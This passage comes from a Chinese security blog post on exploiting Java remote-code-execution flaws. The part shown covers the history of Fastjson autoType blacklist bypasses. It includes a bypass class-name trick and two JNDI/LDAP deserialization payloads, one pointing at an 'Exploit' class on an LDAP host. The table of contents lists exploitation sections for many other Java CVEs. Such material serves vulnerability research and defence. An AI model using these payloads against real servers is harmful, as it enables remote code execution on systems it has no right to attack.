<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.2.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/blog-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/blog-16x16.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.lug.ustc.edu.cn/css?family=Noto+Serif+SC:300,300italic,400,400italic,700,700italic%7CRoboto+Mono:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css" integrity="sha256-AbA177XfpSnFEvgpYu1jMygiLabzPCJCRIBtR5jGc0k=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"l0n9w4y.cc","root":"/","images":"/images","scheme":"Mist","darkmode":true,"version":"8.13.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"default"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>

    <meta name="description" content="本文记录Java高危高频利用的RCE漏洞基本原理、利用条件及方法..">
<meta property="og:type" content="article">
<meta property="og:title" content="Java RCE漏洞利用篇">
<meta property="og:url" content="https://l0n9w4y.cc/posts/50056/index.html">
<meta property="og:site_name" content="L0n9w4y">
<meta property="og:description" content="本文记录Java高危高频利用的RCE漏洞基本原理、利用条件及方法..">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2021-10-05T14:39:13.000Z">
<meta property="article:modified_time" content="2022-12-21T07:48:46.899Z">
<meta property="article:author" content="L0n9w4y">
<meta property="article:tag" content="Execution">
<meta property="article:tag" content="Vulnerability">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://l0n9w4y.cc/posts/50056/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://l0n9w4y.cc/posts/50056/","path":"posts/50056/","title":"Java RCE漏洞利用篇"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>Java RCE漏洞利用篇 | L0n9w4y</title>
  






  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">L0n9w4y</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-攻防"><a href="/A&D/" rel="section"><i class="fa fa-navicon fa-fw"></i>攻防</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
  </ul>
</nav>




</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-Fastjson"><span class="nav-text">0x01 Fastjson</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%B2"><span class="nav-text">1. 反序列化漏洞史</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%A9%E7%94%A8"><span class="nav-text">2. 漏洞复现及利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E5%90%84%E7%89%88%E6%9C%ACpayload"><span class="nav-text">3. 各版本payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reference"><span class="nav-text">Reference</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-Spring%E7%B3%BB%E5%88%97"><span class="nav-text">0x02 Spring系列</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-Spring-WebFlow-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-4971%EF%BC%89"><span class="nav-text">1. Spring WebFlow 远程代码执行漏洞（CVE-2017-4971）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Spring-Messaging-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-1270%EF%BC%89"><span class="nav-text">2. Spring Messaging 远程命令执行漏洞（CVE-2018-1270）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-Spring-Data-Commons-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-1273%EF%BC%89"><span class="nav-text">3. Spring Data Commons 远程命令执行漏洞（CVE-2018-1273）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-Spring-Cloud-Gateway-Actuator-API-SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%88CVE-2022-22947%EF%BC%89"><span class="nav-text">4. Spring Cloud Gateway Actuator API SpEL表达式注入命令执行（CVE-2022-22947）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-Spring-Cloud-Function-SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%EF%BC%88CVE-2022-22963%EF%BC%89"><span class="nav-text">5. Spring Cloud Function SpEL表达式命令注入（CVE-2022-22963）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-Spring-Framework-JDK-gt-x3D-9-RCE%EF%BC%88CVE-2022-22965%EF%BC%89"><span class="nav-text">6. Spring Framework JDK &gt;&#x3D; 9 RCE（CVE-2022-22965）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reference-1"><span class="nav-text">Reference</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-Apache-Shiro"><span class="nav-text">0x03 Apache Shiro</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-Apache-Shiro-1-2-4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89"><span class="nav-text">1.Apache Shiro 1.2.4反序列化漏洞（CVE-2016-4437）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Apache-Shiro-Padding-Oracle-RCE%EF%BC%88CVE-2019-12422%EF%BC%89"><span class="nav-text">2. Apache Shiro Padding Oracle RCE（CVE-2019-12422）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-Apache-Shiro-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-1957%EF%BC%89"><span class="nav-text">3. Apache Shiro 认证绕过漏洞（CVE-2020-1957）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-Apache-Shiro-lt-1-7-1-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-17523%EF%BC%89"><span class="nav-text">4. Apache Shiro &lt; 1.7.1 权限绕过漏洞（CVE-2020-17523）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reference-2"><span class="nav-text">Reference</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-Apache-Solr"><span class="nav-text">0x04 Apache Solr</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-Apache-Solr-XXE-amp-RCE-%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-12629%EF%BC%89"><span class="nav-text">1. Apache Solr XXE &amp; RCE 漏洞（CVE-2017-12629）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Apache-Solr-DataImport-Handler-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2019-0193%EF%BC%89"><span class="nav-text">2. Apache Solr DataImport Handler 命令执行漏洞（CVE-2019-0193）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-Apache-Solr-Velocity-%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE%EF%BC%88CVE-2019-17558%EF%BC%89"><span class="nav-text">3. Apache Solr Velocity 模版注入RCE（CVE-2019-17558）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-Apache-Solr-RemoteStreaming-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8ESSRF%E6%BC%8F%E6%B4%9E"><span class="nav-text">4. Apache Solr RemoteStreaming 文件读取与SSRF漏洞</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-Weblogic"><span class="nav-text">0x05 Weblogic</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-WebLogic-XMLDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-10271%EF%BC%89"><span class="nav-text">1. WebLogic XMLDecoder反序列化漏洞（CVE-2017-10271）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Weblogic-WLS-Core-Components-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-2628%EF%BC%89"><span class="nav-text">2. Weblogic WLS Core Components 反序列化命令执行漏洞（CVE-2018-2628）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-Weblogic-SSRF%E6%BC%8F%E6%B4%9E"><span class="nav-text">3. Weblogic SSRF漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-Weblogic-%E5%B8%B8%E8%A7%84%E6%B8%97%E9%80%8F"><span class="nav-text">4. Weblogic 常规渗透</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-Apache-Tomcat"><span class="nav-text">0x06 Apache Tomcat</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-Tomcat-PUT%E6%96%B9%E6%B3%95%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-12615%EF%BC%89"><span class="nav-text">1. Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Apache-Tomcat-AJP-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-CVE-2020-1938"><span class="nav-text">2. Apache Tomcat AJP 文件读取与包含漏洞 (CVE-2020-1938)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-Tomcat7-%E5%BC%B1%E5%8F%A3%E4%BB%A4-amp-amp-%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E"><span class="nav-text">3. Tomcat7+ 弱口令 &amp;&amp; 后台getshell漏洞</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07-FasterXML-Jackson"><span class="nav-text">0x07 FasterXML Jackson</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Jackson-databind-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-7525%EF%BC%89"><span class="nav-text">Jackson-databind 反序列化漏洞（CVE-2017-7525）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x08-Apache-Dubbo"><span class="nav-text">0x08 Apache Dubbo</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Aapche-Dubbo-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2019-17564%EF%BC%89"><span class="nav-text">Aapche Dubbo Java反序列化漏洞（CVE-2019-17564）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x09-Apache-Flink"><span class="nav-text">0x09 Apache Flink</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-Apache-Flink-REST-API-%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E-CVE-2020-17518"><span class="nav-text">1. Apache Flink REST API 文件写入漏洞(CVE-2020-17518)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Apache-Flinkjobmanager-x2F-logs%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86-CVE-2020-17519"><span class="nav-text">2. Apache Flinkjobmanager&#x2F;logs路径遍历 (CVE-2020-17519)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x0A-HashiCorp-Consul"><span class="nav-text">0x0A HashiCorp Consul</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#HashiCorp-Consul-API-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="nav-text">HashiCorp Consul API 远程命令执行漏洞</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x0B-JBoss"><span class="nav-text">0x0B JBoss</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-JBoss-5-x-x2F-6-x-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-12149%EF%BC%89"><span class="nav-text">1. JBoss 5.x&#x2F;6.x 反序列化漏洞（CVE-2017-12149）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-JBoss-JMXInvokerServlet-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="nav-text">2. JBoss JMXInvokerServlet 反序列化漏洞</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x0C-XStream"><span class="nav-text">0x0C XStream</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-XStream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-21351%EF%BC%89"><span class="nav-text">1. XStream 反序列化命令执行漏洞（CVE-2021-21351）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-XStream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-29505%EF%BC%89"><span class="nav-text">2. XStream 反序列化命令执行漏洞（CVE-2021-29505）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x0D-Apache-ActiveMQ"><span class="nav-text">0x0D Apache ActiveMQ</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-ActiveMQ-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2015-5254%EF%BC%89"><span class="nav-text">1. ActiveMQ 反序列化漏洞（CVE-2015-5254）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Activemq-PUT%E6%96%B9%E6%B3%95%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-3088%EF%BC%89"><span class="nav-text">2. Activemq PUT方法文件上传漏洞（CVE-2016-3088）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x0E-Java-RMI"><span class="nav-text">0x0E Java RMI</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-Java-RMI-Registry-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-lt-x3D-jdk8u111"><span class="nav-text">1. Java RMI Registry 反序列化漏洞(&lt;&#x3D;jdk8u111)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Java-RMI-Registry-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-lt-jdk8u232-b09"><span class="nav-text">2. Java RMI Registry 反序列化漏洞(&lt;jdk8u232_b09)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x0F-Apache-Hadoop-x2F-Spark"><span class="nav-text">0x0F Apache Hadoop&#x2F;Spark</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-Hadoop-YARN-ResourceManager-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="nav-text">1. Hadoop YARN ResourceManager 未授权访问</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Spark-REST-API%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90"><span class="nav-text">2. Spark REST API未授权漏洞利用分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0xFF-Reference"><span class="nav-text">0xFF Reference</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="L0n9w4y"
      src="/images/hexo.png">
  <p class="site-author-name" itemprop="name">L0n9w4y</p>
  <div class="site-description" itemprop="description">問道遠兮，求索未止...</div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">44</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">7</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">44</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author site-overview-item animated">
      <span class="links-of-author-item">
        <a href="https://github.com/L0n9w4y" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;L0n9w4y" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://weibo.com/l0n9w4y" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;l0n9w4y" rel="noopener" target="_blank"><i class="fab fa-weibo fa-fw"></i>Weibo</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://twitter.com/_L0n9_" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;_L0n9_" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
      </span>
  </div>



        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="返回顶部">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="reading-progress-bar"></div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://l0n9w4y.cc/posts/50056/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/hexo.png">
      <meta itemprop="name" content="L0n9w4y">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="L0n9w4y">
      <meta itemprop="description" content="問道遠兮，求索未止...">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="Java RCE漏洞利用篇 | L0n9w4y">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          Java RCE漏洞利用篇
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-10-05 22:39:13" itemprop="dateCreated datePublished" datetime="2021-10-05T22:39:13+08:00">2021-10-05</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/" itemprop="url" rel="index"><span itemprop="name">漏洞研究</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <center>本文记录Java高危高频利用的RCE漏洞基本原理、利用条件及方法..</center>

<span id="more"></span>
<hr>
<p>本文涉及内容，仅限于网络安全从业者学习交流，切勿用于非法用途…</p>
<h2 id="0x01-Fastjson"><a href="#0x01-Fastjson" class="headerlink" title="0x01 Fastjson"></a>0x01 Fastjson</h2><h3 id="1-反序列化漏洞史"><a href="#1-反序列化漏洞史" class="headerlink" title="1. 反序列化漏洞史"></a>1. 反序列化漏洞史</h3><p><strong>fastjson &lt;&#x3D;1.2.24 反序化RCE (CVE-2017-18349)</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Pippo 1.11.0版本中的FastjsonEngine所使用的Fastjson 1.2.25之前版本的parseObject存在安全漏洞。fastjson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并调用该类的set/get方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链，远程攻击者可通过发送特制的JSON请求利用该漏洞执行任意代码</span><br></pre></td></tr></table></figure>

<p><strong>fastjson &lt;&#x3D;1.2.41 反序化RCE</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在1.2.24之后，fastjson1.2.25开始默认关闭对autoType的支持，并且添加checkAutoType方法，其采用了白名单+黑名单的模式对开启autoType开启的情况进行防御。但是在1.2.25-1.2.41版本之间多了一次绕过</span><br></pre></td></tr></table></figure>

<p><strong>fastjson &lt;&#x3D;1.2.42 反序化RCE</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">为了修复L;绕过的问题，在checkAutoType函数中会去掉开头L和结尾; 。并且将黑白名单从明文改成了hash校验，但依然是从前往后一个个字符进行校验。这里的绕过方式也非常简单，通过LLcom.sun.rowset.JdbcRowSetImpl;;绕过</span><br></pre></td></tr></table></figure>

<p><strong>fastjson &lt;&#x3D;1.2.43 反序化RCE</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">针对1.2.42绕过的情况，在版本1.2.43增加了判断条件，检测到LL则抛出异常。然而TypeUtils.loadClass中对以[开始的类名也做了处理，可以继续构造数组形式的类型，在parseArray函数中触发反序列化。</span><br><span class="line"></span><br><span class="line">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;\&quot;dataSourceName\&quot;:\&quot;ldap://localhost/test\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;</span><br><span class="line"></span><br><span class="line">在1.2.44版本中检测到[开始或者L开始;结尾两种情况都会直接抛出异常，至此无法再使用此方式绕过黑名单校验</span><br></pre></td></tr></table></figure>

<p><strong>fastjson &lt;&#x3D;1.2.45 反序化RCE</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">黑名单绕过1.2.44的修复继续反序化RCE：&#123;&quot;@type&quot;:&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;,&quot;properties&quot;:&#123;&quot;data_source&quot;:&quot;ldap://localhost:1399/Exploit&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><strong>fastjson &lt;&#x3D;1.2.47 反序化RCE</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.sun.rowset.JdbcRowSetImpl方法绕过继续反序化RCE</span><br></pre></td></tr></table></figure>

<p><strong>fastjson &lt; 1.2.51 远程代码执行</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastjson &lt; 1.2.51版本存在代码执行漏洞，当用户提交一个精心构造的恶意的序列化数据到服务器端时，fastjson在反序列化时存在漏洞，可导致远程任意代码执行</span><br></pre></td></tr></table></figure>

<p><strong>fastjson &lt; 1.2.61 反序化RCE</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastjson采用黑名单的方法来防御反序列化漏洞，导致当黑客不断发掘新的可攻击的反序列化Gadgets类时，则可轻松绕过黑名单防御机制，反序列化漏洞就会再次出现。fastjson自1.2.25以上默认关闭autotype，默认配置不受漏洞影响</span><br></pre></td></tr></table></figure>

<p><strong>fastjson &lt;&#x3D;1.2.62 反序化RCE</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.xbean.propertyeditor.JndiConverter方法绕过继续反序化RCE</span><br></pre></td></tr></table></figure>

<p><strong>fastjson &lt; 1.2.66 反序化RCE</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastjson采用黑名单的方法来防御反序列化漏洞，导致当黑客不断发掘新的可攻击的反序列化Gadgets类时，则可轻松绕过黑名单防御机制，反序列化漏洞就会再次出现。fastjson自1.2.25以上默认关闭autotype，默认配置不受漏洞影响</span><br></pre></td></tr></table></figure>

<p><strong>fastjson &lt; 1.2.67 反序列化&#x2F;SSRF漏洞</strong></p>
